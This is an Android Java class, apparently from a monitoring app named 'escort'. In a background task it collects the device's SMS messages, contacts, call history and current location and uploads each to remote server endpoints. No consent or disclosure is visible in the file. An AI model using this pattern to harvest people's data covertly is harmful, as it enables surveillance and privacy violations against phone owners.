package sumon.com.escort;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;
import org.json.JSONObject;
import java.io.UnsupportedEncodingException;

public class PostRequestHandler extends AsyncTask<Void, Void, String> {

    private Context context;
    private String TAG = EscortDBHandler.class.getSimpleName();

    PostRequestHandler(Context context){

        this.context = context;
    }

    @Override
    protected void onPreExecute() {

        super.onPreExecute();
    }

    @Override
    protected String doInBackground(Void... voids) {

        try {
            RequestHandler requestHandler = new RequestHandler();
            EscortDBHandler escortDBHandler = new EscortDBHandler(context);
            long lastUpdatedTime = escortDBHandler.getLastUpdatedTime();
            Log.i(TAG, "last updated time : " + lastUpdatedTime);

            MobileSMS mobileSMS = new MobileSMS(context, lastUpdatedTime);
            JSONObject smsObject = mobileSMS.getSMS();
            String smsUrl = RequestUrl.URL_INSERT_SMS;

            MobileContacts mobileContacts = new MobileContacts(context, lastUpdatedTime);
            JSONObject contactsObject = mobileContacts.getContacts();
            String contactUrl = RequestUrl.URL_INSERT_CONTACTS;

            CallHistory callHistory = new CallHistory(context, lastUpdatedTime);
            JSONObject callHistoryObject = callHistory.getCallHistory();
            String callHistoryUrl = RequestUrl.URL_INSERT_CALL_HISTORY;

            LocationTracker locationTracker = new LocationTracker(context);
            JSONObject locationObject = locationTracker.getCurrentLocation();
            String locationUrl = RequestUrl.URL_INSERT_LOCATION;

            String smsResponse = requestHandler.postRequestHandler(smsUrl, smsObject);
            String contactResponse = requestHandler.postRequestHandler(contactUrl, contactsObject);
            String callHistoryResponse = requestHandler.postRequestHandler(callHistoryUrl, callHistoryObject);
            String locationResponse = requestHandler.postRequestHandler(locationUrl, locationObject);

            long newUpdatedTime = System.currentTimeMillis();
            escortDBHandler.insertIntoUpdatedTimeTable(newUpdatedTime);
            Log.i(TAG, "new updated time : " + newUpdatedTime);

            //return smsResponse;
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (Exception e){
            e.printStackTrace();
        }

        return null;
    }

    @Override
    protected void onPostExecute(String s) {

        super.onPostExecute(s);
    }
}
